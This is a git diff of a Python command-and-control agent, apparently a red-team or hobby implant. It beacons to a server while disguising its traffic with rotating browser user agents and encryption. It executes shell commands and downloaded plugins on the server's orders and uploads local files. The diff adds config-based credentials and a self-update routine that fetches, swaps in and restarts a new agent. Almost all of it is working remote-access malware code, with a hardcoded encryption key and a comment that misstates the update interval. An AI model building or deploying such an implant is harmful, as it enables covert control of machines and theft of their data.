@@ -12,31 +12,68 @@ import platform
 from cryptography.fernet import Fernet
 import importlib.util
 from multiprocessing import Process
-from datetime import datetime ,timezone
+from datetime import datetime, timezone
 from pathlib import Path
-import shutil
+import hashlib
+import tempfile
+import textwrap
 import threading
+
 SERVER_URL = "https://127.0.0.1"
 BEACON_ENDPOINT = "/beacon"
 RESULT_ENDPOINT = "/result"
 UPLOAD_ENDPOINT = "/upload"
 LOGIN_ENDPOINT = "/login"
 
-username = "agent1"
-password = "pass1"
+config_data = {}
 
+# Get the absolute path of the current script (e.g., /path/to/Agent2.py)
+script_path = os.path.abspath(__file__)
+
+# Strip the .py extension and add .conf (resulting in /path/to/Agent2.conf)
+config_file_path = os.path.splitext(script_path)[0] + '.conf'
+
+try:
+    with open(config_file_path, 'r') as file:
+        for line in file:
+            # Strip whitespace and skip empty lines or comments
+            line = line.strip()
+            if not line or line.startswith('#'):
+                continue
+
+            # Split by the first '=' found
+            if '=' in line:
+                key, value = line.split('=', 1)
+
+                # Clean up whitespace and strip accidental literal quotes
+                key = key.strip()
+                value = value.strip().strip('"').strip("'")
+
+                config_data[key] = value
+
+except FileNotFoundError:
+    print(f"Error: The file {config_file_path} was not found.")
+    # Handle the missing file appropriately (e.g., set defaults or exit)
+
+# Extract your variables from the dictionary
+username = config_data.get("username")
+password = config_data.get("password")
+AGENT_ID = config_data.get("AGENT_ID")
+AGENT_GROUP = config_data.get("AGENT_GROUP")
+AGENT_VERSION = "1.0.3"
 SLEEP_MIN = 5
 SLEEP_MAX = 10
 
-AGENT_ID = "1"
-AGENT_GROUP = "TEST"
 TOKEN = ""
 scheduled_tasks = []
 
+UPDATE_CHECK_INTERVAL = 10  # 2 hours in seconds
+UPDATE_FLAG = ".updated_recently"
+
 USER_AGENTS = [
-"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/115.0.0.0 Safari/537.36",
-"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 Version/16.0 Safari/605.1.15",
-"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/117.0.0.0 Safari/537.36"]
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/115.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 Version/16.0 Safari/605.1.15",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/117.0.0.0 Safari/537.36"]
 
 SECRET_KEY = b'8zQ0wY9DwMZ5N63DR-3h9C7F5htGvA2I7ReG0i8ER6U='
 cipher = Fernet(SECRET_KEY)
@@ -85,7 +122,6 @@ def decrypt_data(data):
 
 
 def get_system_info():
-
     return {
         "id": AGENT_ID,
         "hostname": socket.gethostname(),
@@ -111,12 +147,10 @@ def login():
             timeout=10
         )
 
-
         if response.status_code != 200:
             return False
 
         data = response.json()
-
 
         if data.get("status") == "ok":
             TOKEN = data.get("token")
@@ -131,8 +165,8 @@ def login():
         print("Login exception:", e)
         return False
 
-def beacon():
 
+def beacon():
     headers = {"USER-AGENT": random.choice(USER_AGENTS), "TOKEN": TOKEN}
 
     payload = get_system_info()
@@ -166,11 +200,10 @@ def beacon():
             task_uuid = task_to_run["uuid"]
             scheduled_at = task_to_run["scheduled_at"]
 
-
             scheduled_at_cmp = datetime.fromisoformat(scheduled_at)
             current_time = datetime.now(timezone.utc)
 
-            if scheduled_at_cmp <=current_time:
+            if scheduled_at_cmp <= current_time:
                 if task and task_uuid:
                     execute_task(task, task_uuid)
 
@@ -182,7 +215,6 @@ def beacon():
 
 
 def execute_task(task, task_uuid):
-
     task_type = task.get("type")
 
     print(f"[+] Task Type: {task_type}")
@@ -212,55 +244,181 @@ def execute_task(task, task_uuid):
 
         print(f"[+] Sleep changed to {SLEEP_MIN}-{SLEEP_MAX} seconds")
         executed_at = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
-        post_result(f"[+] Sleep changed to {SLEEP_MIN}-{SLEEP_MAX} seconds",task_uuid,executed_at)
+        post_result(f"[+] Sleep changed to {SLEEP_MIN}-{SLEEP_MAX} seconds", task_uuid, executed_at)
 
 
-def agent_update_periodic(seconds=60):
-    '''
-    Not used yet, needs updating and restructure
-    '''
-    def agent_update():
-        agent_file = os.path.abspath(__file__)
-        update_url = SERVER_URL + "/agent_update"
-        agent_version = "1.0.2"
+last_update_check = None
+update_lock = threading.Lock()
+
+
+def check_for_update():
+    """Check for update without terminating on failure"""
+    agent_file = os.path.abspath(__file__)
+    update_url = SERVER_URL + "/agent_update"
+    print("[*] Checking for update...")
+    headers = {"USER-AGENT": random.choice(USER_AGENTS), "TOKEN": TOKEN}
+    payload = {"version": AGENT_VERSION, "id": AGENT_ID}
+    encrypted_payload = encrypt_data(json.dumps(payload))
+
+    try:
+        response = session.post(update_url, headers=headers, json=payload, timeout=10)
+        response.raise_for_status()
+        data = response.json()
+
+        if not data.get("update", False):
+            print("[*] No update available.")
+            return True  # Return True to indicate successful check
+
+        print("[+] Update found!")
+        download_url = SERVER_URL + data["download_url"]
+        expected_hash = data["sha256"]
 
         try:
-            print("Checking for update...")
+            download_update(download_url, expected_hash)
+            return True
+        except Exception as e:
+            print(f"[!] Update download/verification failed: {e}")
+            return False
 
-            headers = {"USER-AGENT": random.choice(USER_AGENTS), "TOKEN": TOKEN}
-            payload = {"version": agent_version, "id": AGENT_ID}
-            encrypted_payload = encrypt_data(json.dumps(payload))
+    except requests.exceptions.Timeout:
+        print("[!] Update check timed out (server not responding)")
+        return False
+    except requests.exceptions.ConnectionError:
+        print("[!] Update check failed: Connection error (server may be down)")
+        return False
+    except requests.exceptions.RequestException as e:
+        print(f"[!] Update check failed: {e}")
+        return False
+    except Exception as e:
+        print(f"[!] Unexpected error during update check: {e}")
+        return False
 
-            response = session.post(update_url, headers=headers, json=payload)
-            response.raise_for_status()
 
-            if response.status_code == 400:
-                print("No update available.")
-            else:
-                tmp_file = agent_file + ".tmp"
-                with open(tmp_file, "wb") as f:
-                    f.write(response.content)
+def download_update(download_url, expected_hash):
+    """Download and verify update"""
+    headers = {"TOKEN": TOKEN, "USER-AGENT": random.choice(USER_AGENTS)}
+    response = session.get(download_url, headers=headers, allow_redirects=False, timeout=30)
+    response.raise_for_status()
+    new_file = "agent_new.py"
 
-                backup_file = agent_file + ".bak"
-                shutil.move(agent_file, backup_file)
-                shutil.move(tmp_file, agent_file)
+    with open(new_file, "wb") as f:
+        f.write(response.content)
 
-                print("Update applied! Restarting...")
-                os.execv(sys.executable, [sys.executable] + sys.argv)
+    verify_hash(new_file, expected_hash)
+    launch_updater(new_file)
+
+
+def verify_hash(filepath, expected_hash):
+    """Verify SHA256 hash of downloaded file"""
+    sha256 = hashlib.sha256()
+    with open(filepath, "rb") as f:
+        while chunk := f.read(8192):
+            sha256.update(chunk)
+    actual_hash = sha256.hexdigest()
+
+    if actual_hash != expected_hash:
+        os.remove(filepath)  # Clean up bad file
+        raise Exception(f"Hash mismatch! Expected {expected_hash}, got {actual_hash}")
+
+    print("[+] Hash verified.")
+
+
+def launch_updater(new_file):
+    """Launch updater subprocess"""
+    current_file = os.path.abspath(__file__)
+    updater_code = textwrap.dedent("""
+        import sys
+        import os
+        import shutil
+        import subprocess
+        import time
+
+        current_file = sys.argv[1]
+        new_file = sys.argv[2]
+        backup_file = current_file + ".bak"
+
+        time.sleep(2)
+
+        try:
+            print("[*] Replacing agent...")
+            # backup old
+            if os.path.exists(backup_file):
+                os.remove(backup_file)
+            shutil.move(current_file, backup_file)
+
+            # install new
+            shutil.move(new_file, current_file)
+
+            # create update flag
+            flag_file = os.path.join(
+                os.path.dirname(current_file),
+                ".updated_recently"
+            )
+            with open(flag_file, "w") as f:
+                f.write("updated")
+
+            print("[+] Restarting updated agent...")
+            subprocess.Popen([
+                sys.executable,
+                current_file
+            ])
+            print("[+] Update successful.")
 
         except Exception as e:
-            print("Update failed:", e)
+            print(f"[!] Update failed: {e}")
+            if os.path.exists(backup_file):
+                shutil.move(backup_file, current_file)
+            os._exit(1)
+    """)
 
-        # Reschedule the next run
-        threading.Timer(seconds, agent_update).start()
+    with tempfile.NamedTemporaryFile(
+            "w",
+            delete=False,
+            suffix=".py"
+    ) as tmp_file:
+        tmp_file.write(updater_code)
+        updater_path = tmp_file.name
 
-    # Initial call
-    agent_update()
+    subprocess.Popen([
+        sys.executable,
+        updater_path,
+        current_file,
+        new_file
+    ])
 
+    print("[*] Updater launched. Exiting agent.")
+    sys.exit(0)
+
+
+def periodic_update_checker():
+    """
+    Background thread that checks for updates every UPDATE_CHECK_INTERVAL seconds.
+    This runs independently from the main beacon loop.
+    """
+    global last_update_check
+
+    print("[*] Update checker thread started")
+
+    while True:
+        try:
+            with update_lock:
+                current_time = time.time()
+
+                # Check if enough time has passed since last check
+                if last_update_check is None or (current_time - last_update_check) >= UPDATE_CHECK_INTERVAL:
+                    print(f"\n[*] Performing scheduled update check at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+                    check_for_update()
+                    last_update_check = current_time
+
+            # Sleep for a short interval before checking the timer again
+            time.sleep(60)  # Check every 60 seconds if it's time for an update check
+
+        except Exception as e:
+            print(f"[!] Error in update checker thread: {e}")
+            time.sleep(60)
 
 
 def execute_shell(command, task_uuid):
-
     try:
         process = subprocess.Popen(
             command,
@@ -319,16 +477,17 @@ def execute_plugin(content, module_name, task_uuid):
             module.run()
             executed_at = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
             print(f"[+] Plugin '{module_name}' executed successfully")
-            post_result(f"[+] Plugin '{module_name}' executed", task_uuid,executed_at)
+            post_result(f"[+] Plugin '{module_name}' executed", task_uuid, executed_at)
         else:
             print(f"[!] Plugin '{module_name}' has no run() function")
             executed_at = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
-            post_result(f"[!] Error: Plugin '{module_name}' has no run() function", task_uuid,executed_at)
+            post_result(f"[!] Error: Plugin '{module_name}' has no run() function", task_uuid, executed_at)
 
     except Exception as e:
         print(f"[!] Plugin '{module_name}' crashed: {e}")
         executed_at = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
-        post_result(f"[!] Error: Plugin '{module_name}' crashed: {e}", task_uuid,executed_at)
+        post_result(f"[!] Error: Plugin '{module_name}' crashed: {e}", task_uuid, executed_at)
+
 
 def download_file(url, save_as=None, task_uuid=None):
     try:
@@ -353,20 +512,20 @@ def download_file(url, save_as=None, task_uuid=None):
                 p.terminate()
                 p.join()
                 executed_at = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
-                post_result(f"[!] Error: Plugin '{module_name}' aborted due to timeout", task_uuid,executed_at)
+                post_result(f"[!] Error: Plugin '{module_name}' aborted due to timeout", task_uuid, executed_at)
         else:
             if save_as is None:
                 save_as = url.split("/")[-1]
             with open(save_as, "wb") as f:
                 f.write(r.content)
             executed_at = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
-            post_result(f"Downloaded file {save_as}", task_uuid,executed_at)
+            post_result(f"Downloaded file {save_as}", task_uuid, executed_at)
 
     except Exception as e:
         print(f"[!] Error: download failed {url}: {e}")
         if task_uuid:
             executed_at = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
-            post_result(f"[!] Error: {e}", task_uuid,executed_at)
+            post_result(f"[!] Error: {e}", task_uuid, executed_at)
 
 
 def upload_file(path_to_file, task_uuid):
@@ -389,24 +548,24 @@ def upload_file(path_to_file, task_uuid):
         executed_at = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
         post_result(
             f"[+] Uploaded {path_to_file} ({response.status_code})",
-            task_uuid,executed_at
+            task_uuid, executed_at
         )
 
     except Exception as e:
 
         print(f"[!] Upload error: {e}")
         executed_at = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
-        post_result(f"[!] Error: Failed to upload : {e}", task_uuid,executed_at)
+        post_result(f"[!] Error: Failed to upload : {e}", task_uuid, executed_at)
 
 
-def post_result(result, task_uuid,executed_at=None):
+def post_result(result, task_uuid, executed_at=None):
     headers = {"USER-AGENT": random.choice(USER_AGENTS), "TOKEN": TOKEN}
 
     payload = {
         "id": AGENT_ID,
         "output": result,
         "uuid": task_uuid,
-        "executed_at":executed_at
+        "executed_at": executed_at
     }
 
     encrypted_payload = encrypt_data(json.dumps(payload))
@@ -425,29 +584,55 @@ def post_result(result, task_uuid,executed_at=None):
 
 
 def main():
+    """Main agent loop"""
+    print(f"[*] Agent starting at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+    print(f"[*] Update check interval: {UPDATE_CHECK_INTERVAL // 3600} hours")
+    print(f"[*] Verify mode: {session.verify}")
+
+    # Try to authenticate
     attempts = 0
-    print("VERIFY MODE:", session.verify)
-    print("CERT:", session.cert)
     while attempts < 5:
         if login():
             print("[+] Agent authenticated")
-            #agent_update_periodic()
             break
         else:
             attempts += 1
-            print(f"[!] Agent login failed (attempt {attempts}/{5})")
-            time.sleep(3)  # wait a bit before retrying
+            print(f"[!] Agent login failed (attempt {attempts}/5)")
+            time.sleep(3)
     else:
         print("[!] Max login attempts reached. Exiting...")
         return
 
-    # Main loop after successful login
-    while True:
-        #run_mtls_requests()
-        beacon()
-        sleep_time = random.randint(SLEEP_MIN, SLEEP_MAX)
-        print(f"[+] Sleeping {sleep_time} seconds")
-        time.sleep(sleep_time)
+    # Start the update checker thread as a daemon
+    # This makes it terminate when the main program exits
+    update_thread = threading.Thread(target=periodic_update_checker, daemon=True)
+    update_thread.start()
+    print("[+] Update checker thread started")
+
+    # Check if this is a fresh restart after update
+    if os.path.exists(UPDATE_FLAG):
+        print("[+] Agent was recently updated")
+        os.remove(UPDATE_FLAG)
+
+    # Main beacon loop
+    print("[+] Entering main beacon loop")
+
+    try:
+        while True:
+            beacon()
+
+            sleep_time = random.randint(SLEEP_MIN, SLEEP_MAX)
+            print(f"[*] Sleeping {sleep_time} seconds...")
+            time.sleep(sleep_time)
+
+    except KeyboardInterrupt:
+        print("\n[*] Agent interrupted by user (Ctrl+C)")
+        print("[*] Shutting down gracefully...")
+        sys.exit(0)
+    except Exception as e:
+        print(f"[!] Unexpected error in main loop: {e}")
+        sys.exit(1)
+
 
 if __name__ == "__main__":
     main()
